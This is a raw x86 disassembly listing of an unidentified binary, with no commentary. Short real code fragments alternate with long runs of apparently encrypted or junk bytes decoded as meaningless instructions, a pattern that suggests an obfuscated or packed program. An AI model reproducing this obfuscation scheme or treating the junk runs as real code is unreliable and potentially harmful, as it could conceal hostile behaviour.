  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433713,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4336e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433713,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43368f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43371b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43369b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433753,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x7dcdc5f
  406b85:	test   DWORD PTR [edx],0xbc7e7e3b
  406b8b:	jg     0x406c0b
  406b8d:	jle    0x406b55
  406b8f:	out    dx,eax
  406b90:	inc    esi
  406b91:	add    BYTE PTR [edi-0x57],dh
  406b94:	cmc    
  406b95:	mov    BYTE PTR [ebx-0x15],dh
  406b98:	jmp    0x95727c43
  406b9d:	pop    esi
  406b9e:	mov    gs,WORD PTR [ebx]
  406ba0:	push   ebx
  406ba1:	imul   edi,DWORD PTR [ebx-0x63551a36],0x8422be4b
  406bab:	mov    dl,0xb
  406bad:	sbb    esi,ecx
  406baf:	arpl   WORD PTR [ebx+0x9],bp
  406bb2:	imul   ebp,esp,0xffffffbb
  406bb5:	test   DWORD PTR [esi-0x6e],edx
  406bb8:	pop    esi
  406bb9:	cmp    al,0x9f
  406bbb:	mov    ebx,0x470a424f
  406bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bc1:	push   ds
  406bc2:	clc    
  406bc3:	add    DWORD PTR [edx+0x1cd95cff],esp
  406bc9:	sbb    DWORD PTR [esi+0x27],ecx
  406bcc:	mov    ds:0xccf4e950,al
  406bd1:	adc    eax,0xf94b4798
  406bd6:	outs   dx,DWORD PTR ds:[esi]
  406bd7:	mov    esi,?
  406bd9:	pushf  
  406bda:	and    BYTE PTR [ebp+ecx*8-0x43d71b9d],dl
  406be1:	das    
  406be2:	nop
  406be3:	xor    al,0x32
  406be5:	pop    esi
  406be6:	push   ds
  406be7:	dec    esi
  406be8:	or     BYTE PTR [esi-0x3a],0xe
  406bec:	(bad)  
  406bed:	fs push ebp
  406bef:	add    ch,BYTE PTR [edx]
  406bf1:	cdq    
  406bf2:	popf   
  406bf3:	iret   
  406bf4:	add    eax,0xaf2fe3e6
  406bf9:	sub    BYTE PTR [edx],bl
  406bfb:	xor    edx,DWORD PTR [edi+0x4f]
  406bfe:	cmp    eax,0x5bb3301b
  406c03:	sub    al,0xa4
  406c05:	stos   BYTE PTR es:[edi],al
  406c06:	xchg   ebp,eax
  406c07:	aam    0xd6
  406c09:	arpl   WORD PTR ds:0x33a653d3,dx
  406c0f:	in     al,0x4a
  406c11:	xor    bh,BYTE PTR [ecx+0x47]
  406c14:	xor    al,BYTE PTR [esi+esi*2+0x62]
  406c18:	fstp   st(7)
  406c1a:	shr    bl,1
  406c1c:	push   ss
  406c1d:	ret    
  406c1e:	adc    al,0xa3
  406c20:	test   al,0x8c
  406c22:	(bad)  
  406c23:	fwait
  406c24:	xor    edi,DWORD PTR [ebx+0x2d]
  406c27:	cmp    bh,BYTE PTR [ecx]
  406c29:	adc    BYTE PTR [esi-0x67537eb1],cl
  406c2f:	sub    ah,BYTE PTR [ecx]
  406c31:	xchg   ebp,eax
  406c32:	ins    BYTE PTR es:[edi],dx
  406c33:	pmaxsw mm3,QWORD PTR [edi]
  406c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c37:	iret   
  406c38:	mov    al,ds:0x89fff654
  406c3d:	xchg   edi,eax
  406c3e:	push   eax
  406c3f:	jbe    0x406bfe
  406c41:	pop    ss
  406c42:	xor    eax,0xc06464a6
  406c47:	xlat   BYTE PTR ds:[ebx]
  406c48:	dec    esp
  406c49:	dec    eax
  406c4a:	addr16 cmp bh,bh
  406c4d:	and    BYTE PTR [edi],bh
  406c4f:	loope  0x406c9b
  406c51:	jmp    0x406c9f
  406c53:	xor    edi,ebp
  406c55:	nop
  406c56:	aas    
  406c57:	xor    DWORD PTR [esi+0x3b],ebx
  406c5a:	mov    DWORD PTR [eax],ebx
  406c5c:	jbe    0x406c01
  406c5e:	dec    ebx
  406c5f:	pop    edx
  406c60:	inc    eax
  406c61:	adc    eax,0x707feea1
  406c66:	scas   eax,DWORD PTR es:[edi]
  406c67:	aaa    
  406c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c6a:	sub    DWORD PTR [bp+si],edx
  406c6d:	dec    edx
  406c6e:	test   al,0x10
  406c70:	test   eax,0x56812ec6
  406c75:	fist   DWORD PTR [edi-0x21426dcd]
  406c7b:	addr16 loop 0x406c3c
  406c7e:	(bad)  
  406c7f:	add    ah,cl
  406c81:	das    
  406c82:	pop    es
  406c83:	stos   BYTE PTR es:[edi],al
  406c84:	sub    edx,DWORD PTR [eax+0x73083137]
  406c8a:	push   ecx
  406c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c8c:	adc    ah,BYTE PTR [edx-0x19]
  406c8f:	xchg   eax,eax
  406c91:	inc    edx
  406c92:	lahf   
  406c93:	loopne 0x406d11
  406c95:	sub    al,0x3a
  406c97:	icebp  
  406c98:	jmp    0x406d09
  406c9a:	sbb    al,0xe9
  406c9c:	call   0x598987
  406ca1:	pop    ecx
  406ca2:	xchg   esp,eax
  406ca3:	xor    esi,0x64
  406ca6:	or     al,ch
  406ca8:	mov    ebx,0xe011d217
  406cad:	mov    ebp,0xdbfe38f4
  406cb2:	lock mov DWORD PTR [esi+0x7554c25d],0x8f6f7e8e
  406cbd:	xor    ch,BYTE PTR [ebp*8-0x235cdfd5]
  406cc4:	ret    
  406cc5:	or     DWORD PTR [ecx+eiz*4],0x1a74e00c
  406ccc:	xor    al,0x97
  406cce:	addps  xmm4,XMMWORD PTR [ebx+0x72fffcb]
  406cd5:	adc    ah,dl
  406cd7:	dec    ecx
  406cd8:	out    0x30,al
  406cda:	sbb    ah,BYTE PTR [esi]
  406cdc:	ret    
  406cdd:	inc    esi
  406cde:	fdiv   QWORD PTR [esi+0x1498e694]
  406ce4:	fstp   TBYTE PTR [eax+eiz*1-0x56]
  406ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce9:	sar    DWORD PTR [esp+edi*1+0x3f],0x5f
  406cee:	lods   eax,DWORD PTR ds:[esi]
  406cef:	sbb    al,0x97
  406cf1:	fnstsw WORD PTR [eax-0x31210fc]
  406cf7:	ret    
  406cf8:	inc    ecx
  406cf9:	xor    ecx,DWORD PTR [eax+0x7d]
  406cfc:	div    BYTE PTR [ecx]
  406cfe:	add    ebx,DWORD PTR [edx-0x35]
  406d01:	mov    ch,0xb5
  406d03:	imul   ebp,esi,0x3c
  406d06:	sbb    ebp,DWORD PTR [edx-0x61]
  406d09:	jne    0x406d40
  406d0b:	lea    esp,[edx+edx*1-0x78a0e2a3]
  406d12:	js     0x406ca3
  406d14:	or     al,0xcf
  406d16:	push   0x150fbc0
  406d1b:	cmc    
  406d1c:	mov    cl,0xda
  406d1e:	xchg   ebp,eax
  406d1f:	rcl    DWORD PTR [eax],cl
  406d21:	ins    DWORD PTR es:[edi],dx
  406d22:	lock ret 
  406d24:	cmp    eax,0xc378a1bd
  406d29:	imul   edx,eax,0x7b
  406d2c:	(bad)  
  406d2d:	repz and ch,BYTE PTR [edi]
  406d30:	lds    eax,FWORD PTR [eax+0x67]
  406d33:	xchg   ebx,eax
  406d34:	and    bl,BYTE PTR [edi+0x7500a4f5]
  406d3a:	inc    esi
  406d3b:	mov    ch,BYTE PTR gs:[eax-0x1c]
  406d3f:	mov    bh,0x21
  406d41:	adc    bh,ch
  406d43:	int3   
  406d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d45:	or     BYTE PTR [esi],bl
  406d47:	mov    ?,WORD PTR [eax+eiz*8]
  406d4a:	pop    es
  406d4b:	pop    es
  406d4c:	jmp    FWORD PTR [eax+0x1d]
  406d4f:	push   ebp
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4337af,0x433693
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4337a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4336e3,0x43368f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xb8
  406d91:	lds    edx,FWORD PTR [ecx+0x3]
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x617e7e7f
  406d9d:	call   0x11030fc9
  406da2:	aas    
  406da3:	popa   
  406da4:	stos   BYTE PTR es:[edi],al
  406da5:	out    dx,eax
  406da6:	outs   dx,DWORD PTR ds:[esi]
  406da7:	mov    edi,DWORD PTR [eax-0x73]
  406daa:	addr16 xchg ebp,eax
  406dac:	fwait
  406dad:	jecxz  0x406db7
  406daf:	repnz sbb edi,DWORD PTR [eax+0x39]
  406db3:	add    BYTE PTR [ebp+0x49],bh
  406db6:	jo     0x406d8b
  406db8:	sub    al,dl
  406dba:	mov    ecx,0x7bb4b5ec
  406dbf:	lods   eax,DWORD PTR ds:[esi]
  406dc0:	jae    0x406d5d
  406dc2:	loopne 0x406dc4
  406dc4:	mov    dh,0x1
  406dc6:	inc    esp
  406dc7:	daa    
  406dc8:	mov    DWORD PTR [edi],ebx
  406dca:	arpl   WORD PTR [edx],cx
  406dcc:	cmp    BYTE PTR [ebx+0x11],dl
  406dcf:	xor    esp,edi
  406dd1:	add    eax,0x8fc2bb6d
  406dd6:	or     cl,BYTE PTR [eax]
  406dd8:	push   ebp
  406dd9:	pop    es
  406dda:	dec    ebp
  406ddb:	xor    DWORD PTR [edi+0x14],ebx
  406dde:	nop
  406ddf:	push   edx
  406de0:	inc    edx
  406de1:	popa   
  406de2:	sbb    al,0xba
  406de4:	fnsave [esi]
  406de6:	jmp    0x406dc7
  406de8:	pop    edi
  406de9:	loope  0x406d81
  406deb:	jl     0x406df6
  406ded:	out    0x6d,eax
  406def:	in     al,dx
  406df0:	xor    eax,0x898ae48a
  406df5:	xchg   DWORD PTR [ebx-0x3],ecx
  406df8:	push   ds
  406df9:	mov    ds:0x877d1cd,al
  406dfe:	fild   QWORD PTR [eax-0x3a]
  406e01:	pop    ecx
  406e02:	inc    eax
  406e03:	xor    ch,BYTE PTR [edi+edi*1-0x52]
  406e07:	loope  0x406e74
  406e09:	pop    esi
  406e0a:	ins    DWORD PTR es:[edi],dx
  406e0b:	(bad)  
  406e0c:	hlt    
  406e0d:	enter  0x5732,0x86
  406e11:	(bad)  
  406e12:	ins    DWORD PTR es:[edi],dx
  406e13:	dec    esi
  406e14:	jge    0x406dce
  406e16:	mov    esi,0x5ca57fdb
  406e1b:	ss pop edi
  406e1d:	jmp    0x406de5
  406e1f:	popf   
  406e20:	test   BYTE PTR [eax+0x663ae542],cl
  406e26:	gs ret 0xdd49
  406e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2b:	mov    ah,0x62
  406e2d:	fnstcw WORD PTR [eax+0x140c6606]
  406e33:	mov    esp,DWORD PTR [edx]
  406e35:	sti    
  406e36:	and    al,0xf4
  406e38:	lock fsub st(1),st
  406e3b:	loopne 0x406dec
  406e3d:	ins    DWORD PTR es:[edi],dx
  406e3e:	mov    ch,0x75
  406e40:	mov    esi,DWORD PTR [edx]
  406e42:	mov    ecx,0xc8337493
  406e47:	(bad)  
  406e48:	in     al,0xf2
  406e4a:	or     bh,BYTE PTR [esi-0x77]
  406e4d:	mov    ecx,0xfbf321e3
  406e52:	cmp    BYTE PTR [ecx+0x3a990f8c],bh
  406e58:	loopne 0x406e43
  406e5a:	and    al,0x22
  406e5c:	dec    eax
  406e5d:	loope  0x406e73
  406e5f:	jae    0x406e1e
  406e61:	push   ebp
  406e62:	in     al,0xb7
  406e64:	lahf   
  406e65:	rol    dh,cl
  406e67:	mul    BYTE PTR ds:0xed87c8a
  406e6d:	lods   al,BYTE PTR ds:[esi]
  406e6e:	jecxz  0x406e3f
  406e70:	mov    ds:0xf010984d,eax
  406e75:	xor    DWORD PTR [ebx+0x5a3c277f],esp
  406e7b:	add    BYTE PTR [eax],dh
  406e7d:	sbb    BYTE PTR [ebp+0x7b83f9d4],dh
  406e83:	test   DWORD PTR [ebx-0x743b9fc8],0x6c7af21
  406e8d:	xchg   edi,eax
  406e8e:	call   FWORD PTR [ebx-0x9]
  406e91:	pop    ecx
  406e92:	(bad)  
  406e93:	jl     0x406f0b
  406e95:	stos   DWORD PTR es:[edi],eax
  406e96:	cld    
  406e97:	aaa    
  406e98:	mov    eax,0x7b9fd4ff
  406e9d:	lods   eax,DWORD PTR ds:[esi]
  406e9e:	xchg   DWORD PTR [esi],eax
  406ea0:	add    ebp,edx
  406ea2:	cmp    eax,0x6cd665b2
  406ea7:	push   ebx
  406ea8:	arpl   WORD PTR ss:[ebx],dx
  406eab:	test   DWORD PTR [ecx],eax
  406ead:	ret    0xb9fb
  406eb0:	and    eax,0xdfd5d894
  406eb5:	lock stc 
  406eb7:	addr16 push ds
  406eb9:	xchg   esi,eax
  406eba:	push   esp
  406ebb:	lods   al,BYTE PTR ds:[esi]
  406ebc:	fwait
  406ebd:	int3   
  406ebe:	push   edx
  406ebf:	shr    ecx,0xc0
  406ec2:	adc    ecx,0x25
  406ec5:	mov    esi,DWORD PTR [ebx-0x7b]
  406ec8:	jmp    0xefaace94
  406ecd:	pop    DWORD PTR [ecx+0x47]
  406ed0:	jg     0x406f48
  406ed2:	loopne 0x406f3d
  406ed4:	mov    ds:0x10dd5d68,eax
  406ed9:	xor    DWORD PTR [edx-0x47],edi
  406edc:	fs popf 
  406ede:	sub    eax,0xa62b47aa
  406ee3:	push   ds
  406ee4:	mov    ebp,0xd845594b
  406ee9:	pop    ebp
  406eea:	cmp    eax,0xf528ff89
  406eef:	ret    
  406ef0:	inc    esi
  406ef1:	cmp    al,0x75
  406ef3:	retf   0xeae
  406ef6:	mov    ecx,0x2a128998
  406efb:	push   0x8b7df8c7
  406f00:	jg     0x406e8f
  406f02:	test   eax,0x1b99dbeb
  406f07:	mov    cl,0xd9
  406f09:	sub    edx,DWORD PTR [edi]
  406f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f0c:	(bad)  
  406f0d:	adc    al,0x9f
  406f0f:	aas    
  406f10:	pop    edx
  406f11:	jns    0x406f29
  406f13:	mov    BYTE PTR cs:[eax+ebp*2],ch
  406f17:	scas   eax,DWORD PTR es:[edi]
  406f18:	(bad)  
  406f19:	xchg   ebp,eax
  406f1a:	pop    es
  406f1b:	or     eax,0x2935e06f
  406f20:	mov    dh,0xcc
  406f22:	jnp    0x406f78
  406f24:	mov    ds:0x7887666c,al
  406f29:	mov    dh,0x5c
  406f2b:	pop    eax
  406f2c:	scas   eax,DWORD PTR es:[edi]
  406f2d:	xchg   edx,eax
  406f2e:	xchg   ebp,eax
  406f2f:	js     0x406ef8
  406f31:	pusha  
  406f32:	cmp    edi,DWORD PTR [ebx+0x36]
  406f35:	adc    eax,0xd276b19a
  406f3a:	xchg   ecx,eax
  406f3b:	xor    al,0xd9
  406f3d:	and    BYTE PTR [esi-0x6e],bl
  406f40:	add    eax,0xd2b90e0e
  406f45:	adc    eax,0x49f7f05c
  406f4a:	jg     0x406ecf
  406f4c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  406f4e:	idiv   BYTE PTR [esi-0x64]
  406f51:	jmp    0x278e:0x578a18f2
  406f58:	sub    BYTE PTR ds:0xf89f1df4,bl
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43368f,0x4336d3
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x8879c65a
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xc57e7e7f
  406f9f:	cmp    ebx,DWORD PTR [esi]
  406fa1:	popf   
  406fa2:	ret    
  406fa3:	inc    eax
  406fa4:	jns    0x406f54
  406fa6:	xor    eax,0x67ea2ef7
  406fab:	aas    
  406fac:	pop    edi
  406fad:	mov    edx,0x2f69c647
  406fb2:	mov    BYTE PTR [edx],al
  406fb4:	daa    
  406fb5:	sub    al,0x4
  406fb7:	aam    0x40
  406fb9:	mov    fs,WORD PTR [edx+0x6896b9fa]
  406fbf:	sub    BYTE PTR [esi-0x22fb10d3],ah
  406fc5:	in     al,dx
  406fc6:	xchg   ecx,eax
  406fc7:	gs das 
  406fc9:	retf   
  406fca:	adc    BYTE PTR [edx],bh
  406fcc:	outs   dx,DWORD PTR ds:[esi]
  406fcd:	mov    esp,0xfac88b75
  406fd2:	xchg   esp,eax
  406fd3:	idiv   bl
  406fd5:	stos   DWORD PTR es:[edi],eax
  406fd6:	xchg   esp,eax
  406fd7:	psubsb mm5,mm3
  406fda:	add    eax,0x256a6c51
  406fdf:	push   cs
  406fe0:	jne    0x407024
  406fe2:	xchg   edx,eax
  406fe3:	neg    BYTE PTR es:[eax]
  406fe6:	sbb    DWORD PTR [ebp-0xf26b836],edx
  406fec:	push   ebx
  406fed:	popf   
  406fee:	or     ch,bl
  406ff0:	inc    edx
  406ff1:	mov    al,ds:0x823d77c0
  406ff6:	mov    al,ds:0xccc9cd5
  406ffb:	mov    dl,0x0
  406ffd:	sub    edx,edi
  406fff:	inc    ecx
  407000:	fxch   st(6)
  407002:	pop    ds
  407003:	inc    edx
  407004:	sti    
  407005:	dec    ebx
  407006:	retf   
  407007:	ins    DWORD PTR es:[edi],dx
  407008:	ffreep st(7)
  40700a:	cmp    DWORD PTR [ecx-0x63ff8cf],edi
  407010:	add    bh,0xb8
  407013:	sub    DWORD PTR [ebp-0x2856c0d6],0xd0939464
  40701d:	int    0x80
  40701f:	sbb    ch,BYTE PTR [ecx+eax*8+0x2a339a22]
  407026:	popf   
  407027:	stos   DWORD PTR es:[edi],eax
  407028:	push   ecx
  407029:	bound  esi,QWORD PTR [ebp-0x2f]
  40702c:	sbb    BYTE PTR [edi-0x7813779d],dl
  407032:	jge    0x4070a4
  407034:	cmc    
  407035:	and    al,0x20
  407037:	jl     0x406fcb
  407039:	mov    gs,edx
  40703b:	mov    bl,0x78
  40703d:	hlt    
  40703e:	mov    bh,0xb8
  407040:	call   FWORD PTR [ecx-0x45]
  407043:	inc    ebx
  407044:	cdq    
  407045:	inc    eax
  407046:	data16 mov ah,BYTE PTR [ebx-0x6dc31e96]
  40704d:	push   cs
  40704e:	mov    edx,ecx
  407050:	xchg   ecx,eax
  407051:	popa   
  407052:	clc    
  407053:	cmp    al,0x34
  407055:	mov    esi,0xbfceb697
  40705a:	push   esi
  40705b:	sbb    al,0xa3
  40705d:	push   esi
  40705e:	es xor eax,0x36c1f54
  407064:	js     0x40701d
  407066:	push   esi
  407067:	cdq    
  407068:	mov    ah,0xc4
  40706a:	jge    0x407040
  40706c:	push   es
  40706d:	loope  0x4070ca
  40706f:	pop    ebp
  407070:	(bad)  
  407071:	push   ds
  407072:	lods   al,BYTE PTR ds:[esi]
  407073:	gs jge 0x407000
  407076:	add    edx,edx
  407078:	js     0x4070ee
  40707a:	hlt    
  40707b:	sub    bh,al
  40707d:	sub    eax,0x933cd85c
  407082:	xor    ch,ah
  407084:	push   ebx
  407085:	cld    
  407086:	pop    eax
  407087:	call   0x1125918b
  40708c:	xlat   BYTE PTR ds:[ebx]
  40708d:	sub    dh,BYTE PTR [edi-0x62]
  407090:	aas    
  407091:	push   0x6d
  407093:	ds (bad) 
  407095:	(bad)  
  407096:	inc    ecx
  407097:	xchg   DWORD PTR [ebp-0x3c],ebx
  40709a:	mov    eax,ds:0x84e2183f
  40709f:	js     0x40710b
  4070a1:	mov    BYTE PTR [eax],ch
  4070a3:	mov    al,bl
  4070a5:	cmp    BYTE PTR [ebp+0x2b],dl
  4070a8:	jmp    0x802a:0x81a5b8b5
  4070af:	and    al,0xed
  4070b1:	mov    ebp,0x48998d0c
  4070b6:	dec    ecx
  4070b7:	fucomip st,st(5)
  4070b9:	mov    BYTE PTR [edi-0x36d143dd],dl
  4070bf:	mov    cl,0xe2
  4070c1:	mov    eax,ds:0x99bc80de
  4070c6:	inc    esp
  4070c7:	pushf  
  4070c8:	leave  
  4070c9:	adc    bh,BYTE PTR [ebx-0x25]
  4070cc:	mov    ss,WORD PTR [ecx-0x46]
  4070cf:	icebp  
  4070d0:	pop    esp
  4070d1:	dec    ecx
  4070d2:	pushf  
  4070d3:	out    dx,eax
  4070d4:	(bad)  
  4070d5:	iret   
  4070d6:	enter  0x37a4,0xd2
  4070da:	add    al,0x9
  4070dc:	jl     0x4070b2
  4070de:	push   ecx
  4070df:	scas   eax,DWORD PTR es:[edi]
  4070e0:	push   ss
  4070e1:	sbb    bh,al
  4070e3:	stos   DWORD PTR es:[edi],eax
  4070e4:	int3   
  4070e5:	jbe    0x4070bd
  4070e7:	lods   eax,DWORD PTR ds:[esi]
  4070e8:	enter  0x3295,0x83
  4070ec:	cmp    dl,BYTE PTR [ecx]
  4070ee:	xchg   ecx,eax
  4070ef:	icebp  
  4070f0:	add    eax,0x8753a4c4
  4070f5:	inc    edi
  4070f6:	retf   
  4070f7:	xchg   edi,eax
  4070f8:	stos   DWORD PTR es:[edi],eax
  4070f9:	addr16 (bad) 
  4070fb:	push   ss
  4070fc:	fs mov bl,0xd0
  4070ff:	(bad)  
  407100:	in     al,0xc2
  407102:	sub    eax,0xcf02f644
  407107:	fstp   DWORD PTR [ebx]
  407109:	xchg   esi,eax
  40710a:	lock and eax,0x399e4912
  407110:	xchg   esp,eax
  407111:	mov    BYTE PTR [ecx+0x75],0xd2
  407115:	jne    0x407102
  407117:	or     BYTE PTR [ebx],bh
  407119:	mov    ebx,0x522fde7c
  40711e:	inc    esp
  40711f:	cdq    
  407120:	fisttp DWORD PTR [edi-0x7c606e69]
  407126:	sti    
  407127:	(bad)  
  407128:	loop   0x407147
  40712a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40712b:	adc    esp,eax
  40712d:	or     BYTE PTR [esp+ecx*4],dh
  407130:	cmc    
  407131:	push   0x77fd9be1
  407136:	xchg   edx,eax
  407137:	mov    gs,WORD PTR [esi+esi*4-0x7c52dcfc]
  40713e:	add    al,0x5
  407140:	gs mov ch,0x20
  407143:	xchg   ebx,eax
  407144:	enter  0xd742,0x8e
  407148:	mov    ah,0x5b
  40714a:	pop    ecx
  40714b:	sti    
  40714c:	xchg   BYTE PTR [edx],al
  40714e:	and    DWORD PTR [esi-0x58],ebx
  407151:	push   esp
  407152:	push   ecx
  407153:	aaa    
  407154:	sub    eax,0xf12d5952
  407159:	jne    0x4071b8
  40715b:	sti    
  40715c:	int3   
  40715d:	stos   DWORD PTR es:[edi],eax
  40715e:	scas   al,BYTE PTR es:[edi]
  40715f:	sahf   
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	ins    DWORD PTR es:[edi],dx
  40717c:	pop    ds
  40717d:	push   ds
  40717e:	dec    esp
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xe47e7e7f
  407188:	inc    edi
  407189:	mov    ch,0x3d
  40718b:	adc    al,0x32
  40718d:	sbb    edx,DWORD PTR ds:0x1c728f20
  407193:	inc    edi
  407194:	div    BYTE PTR [ecx+ebx*8]
  407197:	aas    
  407198:	ficom  DWORD PTR [esi-0x1a9cd4ac]
  40719e:	jmp    0x40713f
  4071a0:	and    DWORD PTR [esi],ebp
  4071a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071a3:	rcr    DWORD PTR [edx+0x7ffd6bb3],0x39
  4071aa:	cmp    eax,DWORD PTR ds:0xa2b29763
  4071b0:	cmp    BYTE PTR [ebx],0x71
  4071b3:	inc    edi
  4071b4:	and    dl,ch
  4071b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b7:	pop    ebx
  4071b8:	add    eax,DWORD PTR [edx]
  4071ba:	dec    ebp
  4071bb:	bound  ebp,QWORD PTR [edi-0x30]
  4071be:	sub    ebp,DWORD PTR [esi-0x1ff58b0b]
  4071c4:	xchg   esp,eax
  4071c5:	mov    edx,DWORD PTR [ecx]
  4071c7:	sti    
  4071c8:	imul   ecx,DWORD PTR [edx],0xffffff91
  4071cb:	dec    ecx
  4071cc:	stos   DWORD PTR es:[edi],eax
  4071cd:	fwait
  4071ce:	pop    es
  4071cf:	mov    esp,0xcba4c4b2
  4071d5:	test   eax,0xfd4268ab
  4071da:	aaa    
  4071db:	pop    edx
  4071dc:	mov    DWORD PTR [eax+0x74],ebx
  4071df:	in     al,dx
  4071e0:	ror    bh,0x4d
  4071e3:	mov    edx,0x61c8e84a
  4071e8:	sub    BYTE PTR [eax+ebp*1],0x4a
  4071ec:	xchg   ebp,eax
  4071ed:	pop    edx
  4071ee:	push   ds
  4071ef:	lock jmp FWORD PTR [edi-0x2047ed30]
  4071f6:	test   BYTE PTR [ebx],0x78
  4071f9:	test   edx,ebx
  4071fb:	xor    al,0x23
  4071fd:	ins    BYTE PTR es:[edi],dx
  4071fe:	cmp    al,0x6b
  407200:	out    0xf9,eax
  407202:	mov    esi,0xec25a276
  407207:	shl    DWORD PTR [edx],cl
  407209:	hlt    
  40720a:	sbb    al,0x8e
  40720c:	dec    ecx
  40720d:	aaa    
  40720e:	(bad)  
  40720f:	mov    al,ds:0x9cb6667a
  407214:	mov    ah,BYTE PTR [ebx]
  407216:	add    bh,ch
  407218:	jmp    0xfe1e5972
  40721d:	in     al,0x98
  40721f:	mov    cl,0xbb
  407221:	jmp    0x1834:0x11b35753
  407228:	mov    ch,0x2d
  40722a:	addr16 test eax,0x4853af67
  407230:	lods   eax,DWORD PTR ds:[esi]
  407231:	cmp    BYTE PTR [ebx-0x47],ch
  407234:	jmp    0x4071e6
  407236:	xchg   ebx,eax
  407237:	mul    DWORD PTR [edx]
  407239:	sub    edx,DWORD PTR [esi-0x6cf9bec0]
  40723f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407240:	mov    eax,ds:0x23666f7e
  407245:	adc    eax,0xc00c3351
  40724a:	mov    ds:0x774e7f73,al
  40724f:	jmp    0xc7f8:0x98ea6b98
  407256:	xchg   ebp,eax
  407257:	dec    eax
  407258:	cmp    esi,ebx
  40725a:	retf   
  40725b:	xor    al,0x59
  40725d:	add    DWORD PTR es:[edi-0x32],0xea85ef51
  407265:	cmc    
  407266:	dec    esi
  407267:	int3   
  407268:	xor    eax,0xc17f8939
  40726d:	loopne 0x4072d7
  40726f:	clc    
  407270:	dec    ebp
  407271:	jg     0x407270
  407273:	test   eax,0xb7afb2db
  407278:	fdivr  QWORD PTR [edx]
  40727a:	jle    0x40721d
  40727c:	xor    ebx,0xe708f251
  407282:	push   ss
  407283:	mov    eax,edi
  407285:	in     eax,dx
  407286:	pop    ebp
  407287:	and    BYTE PTR [edx],ah
  407289:	push   cs
  40728a:	dec    eax
  40728b:	iret   
  40728c:	retf   
  40728d:	sbb    ch,BYTE PTR [edi+0x7af081c5]
  407293:	pushf  
  407294:	ret    0xb23e
  407297:	push   ds
  407298:	sar    BYTE PTR [ecx+0x3f9ecd50],cl
  40729e:	stos   BYTE PTR es:[edi],al
  40729f:	inc    eax
  4072a0:	xor    ch,ch
  4072a2:	add    DWORD PTR [ecx+0x6da2761e],edi
  4072a8:	shr    DWORD PTR [ebx],0xef
  4072ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ac:	fimul  WORD PTR [ecx-0x12]
  4072af:	jp     0x407265
  4072b1:	in     al,0x9c
  4072b3:	jns    0x4072c9
  4072b5:	jno    0x407313
  4072b7:	and    ch,BYTE PTR [esi-0x2e]
  4072ba:	ret    
